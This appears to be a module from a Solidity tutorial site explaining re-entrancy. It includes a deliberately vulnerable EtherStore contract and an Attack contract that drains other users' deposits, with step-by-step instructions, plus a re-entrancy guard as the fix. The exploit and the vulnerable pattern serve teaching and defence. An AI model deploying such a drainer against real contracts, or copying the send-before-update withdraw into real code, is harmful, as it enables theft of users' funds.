// metadata
export const version = "0.8.17"
export const title = "Re-Entrancy"
export const description = "An example of re-entrancy attack in Solidity"
export const codes = [
  {
    fileName: "ReEntrancy.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xNzsKCi8qCkV0aGVyU3RvcmUgaXMgYSBjb250cmFjdCB3aGVyZSB5b3UgY2FuIGRlcG9zaXQgYW5kIHdpdGhkcmF3IEVUSC4KVGhpcyBjb250cmFjdCBpcyB2dWxuZXJhYmxlIHRvIHJlLWVudHJhbmN5IGF0dGFjay4KTGV0J3Mgc2VlIHdoeS4KCjEuIERlcGxveSBFdGhlclN0b3JlCjIuIERlcG9zaXQgMSBFdGhlciBlYWNoIGZyb20gQWNjb3VudCAxIChBbGljZSkgYW5kIEFjY291bnQgMiAoQm9iKSBpbnRvIEV0aGVyU3RvcmUKMy4gRGVwbG95IEF0dGFjayB3aXRoIGFkZHJlc3Mgb2YgRXRoZXJTdG9yZQo0LiBDYWxsIEF0dGFjay5hdHRhY2sgc2VuZGluZyAxIGV0aGVyICh1c2luZyBBY2NvdW50IDMgKEV2ZSkpLgogICBZb3Ugd2lsbCBnZXQgMyBFdGhlcnMgYmFjayAoMiBFdGhlciBzdG9sZW4gZnJvbSBBbGljZSBhbmQgQm9iLAogICBwbHVzIDEgRXRoZXIgc2VudCBmcm9tIHRoaXMgY29udHJhY3QpLgoKV2hhdCBoYXBwZW5lZD8KQXR0YWNrIHdhcyBhYmxlIHRvIGNhbGwgRXRoZXJTdG9yZS53aXRoZHJhdyBtdWx0aXBsZSB0aW1lcyBiZWZvcmUKRXRoZXJTdG9yZS53aXRoZHJhdyBmaW5pc2hlZCBleGVjdXRpbmcuCgpIZXJlIGlzIGhvdyB0aGUgZnVuY3Rpb25zIHdlcmUgY2FsbGVkCi0gQXR0YWNrLmF0dGFjawotIEV0aGVyU3RvcmUuZGVwb3NpdAotIEV0aGVyU3RvcmUud2l0aGRyYXcKLSBBdHRhY2sgZmFsbGJhY2sgKHJlY2VpdmVzIDEgRXRoZXIpCi0gRXRoZXJTdG9yZS53aXRoZHJhdwotIEF0dGFjay5mYWxsYmFjayAocmVjZWl2ZXMgMSBFdGhlcikKLSBFdGhlclN0b3JlLndpdGhkcmF3Ci0gQXR0YWNrIGZhbGxiYWNrIChyZWNlaXZlcyAxIEV0aGVyKQoqLwoKY29udHJhY3QgRXRoZXJTdG9yZSB7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gdWludCkgcHVibGljIGJhbGFuY2VzOwoKICAgIGZ1bmN0aW9uIGRlcG9zaXQoKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgYmFsYW5jZXNbbXNnLnNlbmRlcl0gKz0gbXNnLnZhbHVlOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KCkgcHVibGljIHsKICAgICAgICB1aW50IGJhbCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIHJlcXVpcmUoYmFsID4gMCk7CgogICAgICAgIChib29sIHNlbnQsICkgPSBtc2cuc2VuZGVyLmNhbGx7dmFsdWU6IGJhbH0oIiIpOwogICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CgogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKICAgIH0KCiAgICAvLyBIZWxwZXIgZnVuY3Rpb24gdG8gY2hlY2sgdGhlIGJhbGFuY2Ugb2YgdGhpcyBjb250cmFjdAogICAgZnVuY3Rpb24gZ2V0QmFsYW5jZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKHVpbnQpIHsKICAgICAgICByZXR1cm4gYWRkcmVzcyh0aGlzKS5iYWxhbmNlOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgRXRoZXJTdG9yZSBwdWJsaWMgZXRoZXJTdG9yZTsKCiAgICBjb25zdHJ1Y3RvcihhZGRyZXNzIF9ldGhlclN0b3JlQWRkcmVzcykgewogICAgICAgIGV0aGVyU3RvcmUgPSBFdGhlclN0b3JlKF9ldGhlclN0b3JlQWRkcmVzcyk7CiAgICB9CgogICAgLy8gRmFsbGJhY2sgaXMgY2FsbGVkIHdoZW4gRXRoZXJTdG9yZSBzZW5kcyBFdGhlciB0byB0aGlzIGNvbnRyYWN0LgogICAgZmFsbGJhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICBpZiAoYWRkcmVzcyhldGhlclN0b3JlKS5iYWxhbmNlID49IDEgZXRoZXIpIHsKICAgICAgICAgICAgZXRoZXJTdG9yZS53aXRoZHJhdygpOwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBhdHRhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICByZXF1aXJlKG1zZy52YWx1ZSA+PSAxIGV0aGVyKTsKICAgICAgICBldGhlclN0b3JlLmRlcG9zaXR7dmFsdWU6IDEgZXRoZXJ9KCk7CiAgICAgICAgZXRoZXJTdG9yZS53aXRoZHJhdygpOwogICAgfQoKICAgIC8vIEhlbHBlciBmdW5jdGlvbiB0byBjaGVjayB0aGUgYmFsYW5jZSBvZiB0aGlzIGNvbnRyYWN0CiAgICBmdW5jdGlvbiBnZXRCYWxhbmNlKCkgcHVibGljIHZpZXcgcmV0dXJucyAodWludCkgewogICAgICAgIHJldHVybiBhZGRyZXNzKHRoaXMpLmJhbGFuY2U7CiAgICB9Cn0K",
  },
  {
    fileName: "ReEntrancyGuard.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xNzsKCmNvbnRyYWN0IFJlRW50cmFuY3lHdWFyZCB7CiAgICBib29sIGludGVybmFsIGxvY2tlZDsKCiAgICBtb2RpZmllciBub1JlZW50cmFudCgpIHsKICAgICAgICByZXF1aXJlKCFsb2NrZWQsICJObyByZS1lbnRyYW5jeSIpOwogICAgICAgIGxvY2tlZCA9IHRydWU7CiAgICAgICAgXzsKICAgICAgICBsb2NrZWQgPSBmYWxzZTsKICAgIH0KfQo=",
  },
]

const html = `<h3 id="vulnerability">Vulnerability</h3>
<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>
<p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.17;</span>

<span class="hljs-comment">/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let&#x27;s see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherStore</span> </span>{
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">uint</span> bal <span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        <span class="hljs-built_in">require</span>(bal <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: bal}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    EtherStore <span class="hljs-keyword">public</span> etherStore;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _etherStoreAddress</span>) </span>{
        etherStore <span class="hljs-operator">=</span> EtherStore(_etherStoreAddress);
    }

    <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
            etherStore.withdraw();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
        etherStore.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
        etherStore.withdraw();
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}
</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<ul>
<li>Ensure all state changes happen before calling external contracts</li>
<li>Use function modifiers that prevent re-entrancy</li>
</ul>
<p>Here is a example of a re-entracy guard</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.17;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ReEntrancyGuard</span> </span>{
    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">internal</span> locked;

    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">noReentrant</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-operator">!</span>locked, <span class="hljs-string">"No re-entrancy"</span>);
        locked <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">_</span>;
        locked <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
`

export default html
